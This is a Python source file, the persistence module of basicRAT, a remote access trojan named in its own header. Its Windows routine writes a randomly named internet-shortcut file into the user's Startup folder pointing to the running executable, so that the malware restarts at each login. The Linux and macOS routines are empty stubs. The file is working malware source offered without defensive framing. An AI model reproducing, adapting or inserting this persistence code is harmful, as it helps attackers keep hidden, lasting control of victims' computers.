#
# basicRAT persistence module
# https://github.com/vesche/basicRAT
#

import sys


def windows_persistence():
    import os, string, random
    try:
        appdata = os.path.expandvars("%AppData%")
        startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
        if os.path.exists(startup_dir):
            random_name = ''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])
            persistence_file = os.path.join(startup_dir, '%s.eu.url' % random_name)

            content = '\n[InternetShortcut]\nURL=file:///%s\n' % sys.executable

            f = open(persistence_file, 'w')
            f.write(content)
            f.close()
        
            return True, 'startup file add success'
        else:
            return False, 'startup file add failed'
    except WindowsError:
        return False, 'startup file add failed'


def linux_persistence():
    return False, 'nothing here yet'


def mac_persistence():
    return False, 'nothing here yet'


def run(plat):
    if plat == 'win':
        success, details = windows_persistence()
    elif plat == 'nix':
        success, details = linux_persistence()
    elif plat == 'mac':
        success, details = mac_persistence()
    else:
        return 'Error, platform unsupported.'

    if success:
        results = 'Persistence successful, {}.'.format(details)
    else:
        results = 'Persistence unsuccessful, {}.'.format(details)

    return results
